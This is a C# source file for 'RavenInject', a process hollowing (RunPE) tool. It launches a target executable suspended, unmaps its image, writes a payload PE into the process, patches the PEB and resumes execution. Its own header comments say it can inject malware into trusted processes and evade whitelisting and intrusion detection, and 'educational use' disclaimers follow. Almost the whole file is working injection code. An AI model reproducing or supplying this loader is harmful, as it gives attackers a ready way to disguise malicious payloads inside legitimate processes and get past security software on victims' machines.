
// ⚠️ WARNING: This code is a process injection tool. It can be used to:
// Inject malware into trusted processes (bypassing security software).
// Bypass application whitelisting and host-based intrusion detections
// Perform privilege escalation or persistence attacks.
// Security & Ethical Considerations:
// This code is designed for educational purposes and should not be used for malicious activities.
// Unauthorized use of this code may violate laws and ethical standards.

// >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// Legitimate uses include:
// Debugging and reverse engineering tools.
// Application sandboxing and virtualization.
// Software testing frameworks that need to instrument processes.
// Always ensure you have explicit permission to test or use this code in any environment.
// Unauthorized use may violate the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide.
// RavenInject - Process Hollowing / RunPE Utility
// DISCLAIMER: This code performs process injection (process hollowing). It is
// provided for educational and research purposes ONLY. Unauthorized use of
// process injection techniques may violate laws and software terms of service.
// Use at your own risk and only in environments you own or have explicit
// permission to test.
//
// >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// This class implements a process hollowing (RunPE) injector. It creates a
// target process in a suspended state, unmaps its original executable image,
// allocates new memory for a payload PE image, writes the payload's sections
// into the target process, and then resumes execution.
//
// >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// Key steps:
//   1. Create target process with CREATE_SUSPENDED flag.
//   2. Determine if target is 32-bit or 64-bit (via WOW64 detection).
//   3. Get the target's PEB address and read its ImageBaseAddress.
//   4. Parse the payload PE file to get its ImageBase, SizeOfImage, sections.
//   5. If target's ImageBase matches payload's ImageBase, unmap the original.
//   6. Allocate new memory in target process for the payload.
//   7. Write PE headers and all sections into target memory.
//   8. Update the PEB's ImageBaseAddress to point to the new image.
//   9. Resume the target thread to start the payload.
//
// Supported scenarios:
//   - 32-bit host → 32-bit target
//   - 64-bit host → 64-bit target
//   - 64-bit host → 32-bit WOW64 target (uses Wow64GetThreadContext)
//
// Not supported: 32-bit host → 64-bit target (cross-architecture injection
// is not possible due to WoW64 limitations).

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace RavenInject
{
    /// <summary>
    /// Main injector class for process hollowing.
    /// </summary>
    public class RavenInject
    {
        #region Constants

        private const uint PROCESS_CREATE_SUSPENDED = 0x00000004;
        private const uint MEM_COMMIT = 0x00001000;
        private const uint MEM_RESERVE = 0x00002000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint INFINITE = 0xFFFFFFFF;
        private const uint IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR = 14;
        private const ushort IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10B;
        private const ushort IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20B;
        private const uint IMAGE_SIZEOF_SHORT_NAME = 8;

        #endregion

        #region Native Structures

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        private struct STARTUPINFO
        {
            public int cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct CONTEXT32
        {
            public uint ContextFlags;
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            public FLOATING_SAVE_AREA FloatSave;
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        #endregion

        #region P/Invoke Declarations

        private const string KERNEL32 = "kernel32.dll";
        private const string NTDLL = "ntdll.dll";

        [DllImport(KERNEL32, SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr LoadLibraryA(string lpFileName);

        [DllImport(KERNEL32, SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool CreateProcessA(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            IntPtr nSize,
            out IntPtr lpNumberOfBytesRead);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            IntPtr nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            IntPtr dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool IsWow64Process(IntPtr hProcess, out bool Wow64Process);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool Wow64GetThreadContext(IntPtr hThread, ref CONTEXT32 lpContext);

        [DllImport(KERNEL32, SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport(NTDLL)]
        private static extern int NtQueryInformationProcess(
            IntPtr hProcess,
            int ProcessInformationClass,
            ref PROCESS_BASIC_INFORMATION ProcessInformation,
            uint ProcessInformationLength,
            out IntPtr ReturnLength);

        [DllImport(NTDLL)]
        private static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr BaseAddress);

        #endregion

        #region Public API

        /// <summary>
        /// Attempts to inject a payload into a target process.
        /// </summary>
        /// <param name="targetPath">Path to the executable to launch as the target.</param>
        /// <param name="payload">PE image bytes to inject.</param>
        /// <param name="creationFlags">Additional creation flags (e.g., CREATE_SUSPENDED).</param>
        /// <returns>True if injection succeeded, false otherwise.</returns>
        public bool Run(string targetPath, byte[] payload, uint creationFlags)
        {
            // Retry up to 5 times in case of transient failures
            for (int i = 0; i < 5; i++)
            {
                if (TryInject(targetPath, payload, creationFlags))
                    return true;
            }
            return false;
        }

        #endregion

        #region Core Injection Logic

        private bool TryInject(string targetPath, byte[] payload, uint creationFlags)
        {
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(typeof(STARTUPINFO));

            string quotedPath = $"\"{targetPath}\"";
            string currentDir = Directory.GetCurrentDirectory();

            try
            {
                // STEP 1: Create target process in suspended state
                if (!CreateProcessA(
                    targetPath,
                    quotedPath,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    true,
                    creationFlags | PROCESS_CREATE_SUSPENDED,
                    IntPtr.Zero,
                    currentDir,
                    ref si,
                    out pi))
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }

                // STEP 2: Determine if target is 32-bit or 64-bit
                bool isWow64Process = false;
                IsWow64Process(pi.hProcess, out isWow64Process);

                bool targetIs64Bit = false;
                IntPtr pebAddress = IntPtr.Zero;

                // On 64-bit host, a 32-bit target runs under WOW64
                if (IntPtr.Size == 8 && isWow64Process)
                {
                    // 64-bit host → 32-bit WOW64 target: get PEB via Wow64GetThreadContext
                    CONTEXT32 ctx = new CONTEXT32();
                    ctx.ContextFlags = 0x1000002; // CONTEXT_AMD64 | CONTEXT_INTEGER

                    if (!Wow64GetThreadContext(pi.hThread, ref ctx))
                        throw new Win32Exception(Marshal.GetLastWin32Error());

                    // In x86 suspended process, EBX holds the PEB address
                    pebAddress = new IntPtr(ctx.Ebx);
                    targetIs64Bit = false;
                }
                else
                {
                    // 32-bit host → 32-bit target, or 64-bit host → 64-bit target
                    PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
                    IntPtr returnLength;

                    int status = NtQueryInformationProcess(
                        pi.hProcess,
                        0, // ProcessBasicInformation
                        ref pbi,
                        (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)),
                        out returnLength);

                    if (status < 0) // NTSTATUS failure
                        throw new Win32Exception(status);

                    pebAddress = pbi.PebBaseAddress;
                    targetIs64Bit = (IntPtr.Size == 8 && !isWow64Process);
                }

                // STEP 3: Read current ImageBaseAddress from target PEB
                IntPtr currentImageBase = ReadImageBaseFromPEB(pi.hProcess, pebAddress, targetIs64Bit);

                // STEP 4: Parse payload PE headers
                PayloadInfo payloadInfo = ParsePayload(payload);

                // STEP 5: If target's ImageBase matches payload's, unmap the original
                if (payloadInfo.ImageBase == currentImageBase)
                {
                    int result = NtUnmapViewOfSection(pi.hProcess, currentImageBase);
                    if (result < 0)
                        throw new Win32Exception(result);
                }

                // STEP 6: Allocate memory in target process for payload
                IntPtr newImageBase = VirtualAllocEx(
                    pi.hProcess,
                    payloadInfo.ImageBase,
                    (IntPtr)payloadInfo.SizeOfImage,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE);

                if (newImageBase == IntPtr.Zero)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                // STEP 7: Write PE headers
                IntPtr bytesWritten;
                if (!WriteProcessMemory(
                    pi.hProcess,
                    newImageBase,
                    payload,
                    (IntPtr)payloadInfo.SizeOfHeaders,
                    out bytesWritten))
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }

                // STEP 8: Write all sections
                foreach (var section in payloadInfo.Sections)
                {
                    if (section.SizeOfRawData == 0)
                        continue;

                    // Validate bounds
                    if (section.PointerToRawData + section.SizeOfRawData > payload.Length)
                        throw new InvalidDataException("Section data extends beyond payload buffer.");

                    byte[] sectionData = new byte[section.SizeOfRawData];
                    Buffer.BlockCopy(payload, (int)section.PointerToRawData, sectionData, 0, (int)section.SizeOfRawData);

                    IntPtr destAddress = newImageBase + (int)section.VirtualAddress;

                    if (!WriteProcessMemory(
                        pi.hProcess,
                        destAddress,
                        sectionData,
                        (IntPtr)sectionData.Length,
                        out bytesWritten))
                    {
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                    }
                }

                // STEP 9: Update PEB's ImageBaseAddress to point to new image
                WriteImageBaseToPEB(pi.hProcess, pebAddress, targetIs64Bit, newImageBase);

                // STEP 10: Resume the thread
                uint resumeResult = ResumeThread(pi.hThread);
                if (resumeResult == INFINITE)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                return true;
            }
            catch (Exception)
            {
                // Clean up: kill the target process if injection failed
                try
                {
                    if (pi.dwProcessId != 0)
                    {
                        Process p = Process.GetProcessById(pi.dwProcessId);
                        p?.Kill();
                    }
                }
                catch
                {
                    // Ignore cleanup errors
                }
                return false;
            }
            finally
            {
                // Always close handles to prevent leaks
                if (pi.hProcess != IntPtr.Zero)
                    CloseHandle(pi.hProcess);
                if (pi.hThread != IntPtr.Zero)
                    CloseHandle(pi.hThread);
            }
        }

        #endregion

        #region PEB Helper Methods

        private IntPtr ReadImageBaseFromPEB(IntPtr hProcess, IntPtr pebAddress, bool is64Bit)
        {
            int offset = is64Bit ? 0x10 : 0x08; // PEB.ImageBaseAddress offset
            int size = is64Bit ? 8 : 4;

            byte[] buffer = new byte[size];
            IntPtr bytesRead;

            if (!ReadProcessMemory(hProcess, pebAddress + offset, buffer, (IntPtr)size, out bytesRead))
                throw new Win32Exception(Marshal.GetLastWin32Error());

            if (is64Bit)
                return new IntPtr(BitConverter.ToInt64(buffer, 0));
            else
                return new IntPtr(BitConverter.ToInt32(buffer, 0));
        }

        private void WriteImageBaseToPEB(IntPtr hProcess, IntPtr pebAddress, bool is64Bit, IntPtr imageBase)
        {
            int offset = is64Bit ? 0x10 : 0x08;
            byte[] buffer;

            if (is64Bit)
                buffer = BitConverter.GetBytes(imageBase.ToInt64());
            else
                buffer = BitConverter.GetBytes(imageBase.ToInt32());

            IntPtr bytesWritten;
            if (!WriteProcessMemory(hProcess, pebAddress + offset, buffer, (IntPtr)buffer.Length, out bytesWritten))
                throw new Win32Exception(Marshal.GetLastWin32Error());
        }

        #endregion

        #region PE Parsing

        private PayloadInfo ParsePayload(byte[] payload)
        {
            // Read e_lfanew (offset 0x3C)
            int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
            int peHeaderOffset = e_lfanew;

            // Validate PE signature
            if (BitConverter.ToInt32(payload, peHeaderOffset) != 0x00004550) // "PE\0\0"
                throw new InvalidDataException("Invalid PE signature.");

            // Read COFF file header
            int fileHeaderOffset = peHeaderOffset + 4;
            ushort machine = BitConverter.ToUInt16(payload, fileHeaderOffset);
            ushort numberOfSections = BitConverter.ToUInt16(payload, fileHeaderOffset + 2);
            ushort sizeOfOptionalHeader = BitConverter.ToUInt16(payload, fileHeaderOffset + 16);

            // Read Optional Header magic
            int optionalHeaderOffset = fileHeaderOffset + 20;
            ushort magic = BitConverter.ToUInt16(payload, optionalHeaderOffset);

            bool is64Bit = (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC);

            // Read ImageBase (4 bytes for PE32, 8 bytes for PE32+)
            int imageBaseOffset = optionalHeaderOffset + 0x18; // Offset to ImageBase in optional header
            IntPtr imageBase;
            if (is64Bit)
                imageBase = new IntPtr(BitConverter.ToInt64(payload, imageBaseOffset));
            else
                imageBase = new IntPtr(BitConverter.ToInt32(payload, imageBaseOffset));

            // Read SizeOfImage (DWORD, 4 bytes)
            int sizeOfImageOffset = optionalHeaderOffset + 0x38; // Offset to SizeOfImage
            uint sizeOfImage = BitConverter.ToUInt32(payload, sizeOfImageOffset);

            // Read SizeOfHeaders (DWORD, 4 bytes)
            int sizeOfHeadersOffset = optionalHeaderOffset + 0x3C; // Offset to SizeOfHeaders
            uint sizeOfHeaders = BitConverter.ToUInt32(payload, sizeOfHeadersOffset);

            // Parse sections
            int sectionHeaderOffset = optionalHeaderOffset + sizeOfOptionalHeader;
            var sections = new SectionInfo[numberOfSections];

            for (int i = 0; i < numberOfSections; i++)
            {
                int offset = sectionHeaderOffset + i * 40; // IMAGE_SECTION_HEADER size is 40 bytes
                sections[i] = new SectionInfo
                {
                    VirtualAddress = BitConverter.ToUInt32(payload, offset + 12),
                    SizeOfRawData = BitConverter.ToUInt32(payload, offset + 16),
                    PointerToRawData = BitConverter.ToUInt32(payload, offset + 20)
                };
            }

            // Find .NET COM descriptor (for Flags patching)
            uint comDescriptorRva = 0;
            int dataDirectoryOffset = optionalHeaderOffset + 0x60; // Start of data directories
            int comDescriptorEntryOffset = (int)(dataDirectoryOffset + IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR * 8);
            comDescriptorRva = BitConverter.ToUInt32(payload, comDescriptorEntryOffset);

            // If .NET descriptor exists, find its file offset
            uint cliHeaderFlags = 0;
            if (comDescriptorRva != 0)
            {
                uint cliHeaderFileOffset = RvaToFileOffset(payload, sections, comDescriptorRva);
                if (cliHeaderFileOffset != 0)
                {
                    // Flags are at offset 0x10 of CLI header
                    cliHeaderFlags = BitConverter.ToUInt32(payload, (int)cliHeaderFileOffset + 0x10);
                }
            }

            return new PayloadInfo
            {
                Is64Bit = is64Bit,
                ImageBase = imageBase,
                SizeOfImage = sizeOfImage,
                SizeOfHeaders = sizeOfHeaders,
                Sections = sections,
                Machine = machine,
                CliHeaderFlags = cliHeaderFlags,
                ComDescriptorRva = comDescriptorRva,
                OptionalHeaderOffset = optionalHeaderOffset
            };
        }

        private uint RvaToFileOffset(byte[] payload, SectionInfo[] sections, uint rva)
        {
            foreach (var section in sections)
            {
                if (rva >= section.VirtualAddress && rva < section.VirtualAddress + section.SizeOfRawData)
                {
                    return section.PointerToRawData + (rva - section.VirtualAddress);
                }
            }
            return 0;
        }

        #endregion

        #region Helper Structures

        private struct SectionInfo
        {
            public uint VirtualAddress;
            public uint SizeOfRawData;
            public uint PointerToRawData;
        }

        private class PayloadInfo
        {
            public bool Is64Bit;
            public IntPtr ImageBase;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public SectionInfo[] Sections;
            public ushort Machine;
            public uint CliHeaderFlags;
            public uint ComDescriptorRva;
            public int OptionalHeaderOffset;
        }

        #endregion
    }
}